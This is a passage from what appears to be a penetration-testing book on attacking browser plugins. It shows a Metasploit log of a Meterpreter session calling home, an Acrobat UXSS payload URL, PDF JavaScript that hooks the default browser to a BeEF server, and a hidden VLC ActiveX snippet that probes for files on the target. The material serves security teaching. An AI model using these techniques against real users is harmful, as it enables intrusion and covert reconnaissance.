
Once the user clicks OK, the program calls home to your `Metasploit` listener. `Metasploit` will create a new session and allow you to interact with your new `Meterpreter` session:

```
msf exploit(handler) > [*] Sending stage (752128 bytes) to 192.168.1.198
[*] Meterpreter session 7 opened (192.168.1.132:8675 ->
  192.168.1.198:50407) at 2013-09-17 01:09:01 -0400

msf exploit(handler) > sessions -i 7
[*] Starting interaction with 7...

meterpreter > sysinfo
Computer        : WIN-758UJIVA5C3
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Meterpreter     : x86/win32
meterpreter > 
```

Though this attack is slightly more complicated, it is also possible to attack ActiveX directly like many other plugins. Vulnerabilities are found all the time in plugins, so it’s a matter of finding a suitable exploit for the target platform.

## Attacking PDF Readers

PDF reader software such as `Acrobat` and `Foxit` are popular targets for malware authors. The primary reason is that PDF documents have a lot of features, and many of them present rich landscapes for attack. For instance, PDF documents can contain `JavaScript`, binary streams, and images. When you combine these things together, it’s possible to both obfuscate code as well as execute that code on page load.

This combination has led to frequent vulnerabilities in PDF readers, with `Adobe Acrobat` being the most popular for both usage and exploitation. In the following section, you learn how to detect PDF readers, how to leverage them for additional access, and how to exploit them for shell access.

Similar to its previous fuzzing Flash file efforts, Google also managed to collect a massive number of PDF files, which were used for fuzzing and bug finding. With this data set, `Mateusz Jurczyk` and `Gynvael Coldwind` were able to identify 50 bugs rated from low to high severity within Chrome’s PDF Reader. Using this data set to fuzz `Adobe`’s PDF Reader also identified at least an additional 25 critical vulnerabilities, many of which were subsequently patched.37

### Using JavaScript in PDFs

`JavaScript` in PDF files has been the source of many of the PDF exploits. PDF files can include `JavaScript` that has access to the document as a whole. This is similar to a browser DOM in that a PDF document has objects and methods as well. These methods can allow `JavaScript` events to fire on PDF elements. This functionality was designed to support interactive forms and documents, providing data validation and enhanced forms.

`JavaScript` is a feature that even `Adobe` has recommended turning off to prevent certain attacks.38 As a result, many security professionals recommend disabling `JavaScript` by default on PDF readers to prevent many of the common attacks.

#### Universal XSS

There have been instances where `JavaScript` inside PDF files has led to exploitable behavior. For example, this occurred with the Universal XSS (UXSS) vulnerability in `Acrobat Reader`. `Stefano Di Paola` and `Giorgio Fedon` shared the research behind this discovery at the 23C3 conference.39 The UXSS vulnerability allows a user to pass arguments into a PDF that will then be able to be processed by the `JavaScript` inside the document.

The vulnerability leverages the fact that older versions of `Acrobat` on `Firefox` parse variables from the URL. Values such as `#FDF` and `#XML` are handled, and the values processed. Therefore, by passing in a value such as `http://browserhacker.com/test.pdf#FDF=javascript:alert('xss')`, the `JavaScript` will be rendered and an alert box will pop up.

Though this has been fixed in newer versions of `Acrobat Reader`, this type of vulnerability is one to watch out for not just with `Acrobat`, but with other plugins as well. The ability to pass external values that influence code execution could lead to more serious issues like remote code execution. For this weakness in `Acrobat Reader`, a double free vulnerability40 was also found that could be leveraged through a URI argument. This makes it even easier to attack older versions of `Acrobat`.

#### Launching Another Browser

One of the features of PDFs is the capability to cause a browser to launch and request a specified URL. Using the `app.launchURL` method, you can cause the OS to launch the default browser.

`BeEF` uses this functionality to hook the default browser from whatever browser a user is employing. This allows whatever the default browser is to be hooked, hopefully allowing for additional exploitation. To use this method, you simply need to call the `JavaScript` code:

```
app.launchURL("http://browserhacker.com:3000/demos/report.html",true);
```

Using this method, the PDF launches the URL that will be handled by the default browser. This will load a new hook granting you access to the new browser session as well. The Hook Default Browser module as seen in [Figure 8-20](#c08.html#figure8-20) takes a hooked browser and sends it a PDF. The PDF in turn launches the URL back to the hook, and the default browser launches with the new hooked page.

 start figure 

[**Figure 8-20:**](#c08.html#figureanchor8-20) The “Hook Default Browser” module in BeEF

![c08f020.tif](image_fi/662090c08/c08f020.png)

 end figure 

There’s a chance that the user may see a pop-up when executing this method, alerting him that an external window was launched. Pay attention to whether the stoplight for the module is green or red, because certain browsers react better to this technique than others.

This attack scenario is particularly useful in corporate environments. If a victim is hooked through `Chrome`, but the default browser happens to be the corporate-sanctioned `IE 7` or `IE 8`, then this method will widen your attack surface.

## Attacking Media Plugins

Plugins such as `VLC`, `RealPlayer`, and `QuickTime` are also favorites for exploitation. These plugins read specific file format types and render the media. The types of attacks these are vulnerable to are called file format vulnerabilities. These are based on files that are malformed in some way that causes the browser plugin to overwrite pieces of memory, and hopefully execute malicious code.

Media plugins are detected in the browser the same way as other plugins. Plugins may support multiple MIME types for the various types of files that a single plugin may handle. This is particularly the case with media plugins. `QuickTime`, for instance, handles both `.mp4` and `.mov` files, so there would be two MIME types to reflect that.

Media plugins also frequently have to stream data from other servers, load additional files, and perform other activities that may lead to vulnerabilities. In this section you look at how to enumerate files with `VLC`, and execute file format exploits through `Metasploit` against vulnerable plugins.

### Resource Scanning with VLC

As mentioned earlier, media players often have to deal with streaming files and other media while being controlled inside the browser. This functionality is a factor in a `VLC` ActiveX control weakness discovered by `Jason Geffner`. By adding in a playlist item and trying to play it, the ActiveX `VLC` Plugin will give feedback as to whether or not the file in the playlist was valid.

Using this technique, it’s possible to fingerprint directories and files on a remote target system. By adding each item and then checking for an error, you can get immediate feedback as to the existence of a file. This technique can help in fingerprinting OS and installed software versions, identifying users, and even mapping out internal shares:

```
<object style="visibility:hidden"
 classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
 width="0" height="0" id="vlc"></object>
<script>
vlc.playlist.clear();
vlc.playlist.add(items[i]);
vlc.playlist.playItem(0);
vlc.attachEvent("MediaPlayerPlaying", onFound);
vlc.attachEvent("MediaPlayerEncounteredError", onNotFound);
</script>
```
